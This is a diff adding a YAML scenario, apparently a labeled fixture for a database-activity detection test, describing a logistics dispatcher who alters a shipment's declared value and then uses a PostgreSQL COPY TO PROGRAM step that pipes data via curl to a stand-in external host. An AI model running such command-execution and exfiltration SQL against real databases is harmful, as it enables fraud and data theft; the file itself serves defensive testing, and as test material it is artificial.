@@ -1,0 +1,23 @@
+scenario_id: gen_logistics_58_data_tamper_mal_1524
+family_id: gen_logistics_58_data_tamper_mal_fam1524
+domain: logistics
+time_of_day: '22:50'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: dispatcher
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: UPDATE manifests SET declared_value = 324023 WHERE shipment_id = 51208
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 45.77.244.134
+      port: 3389
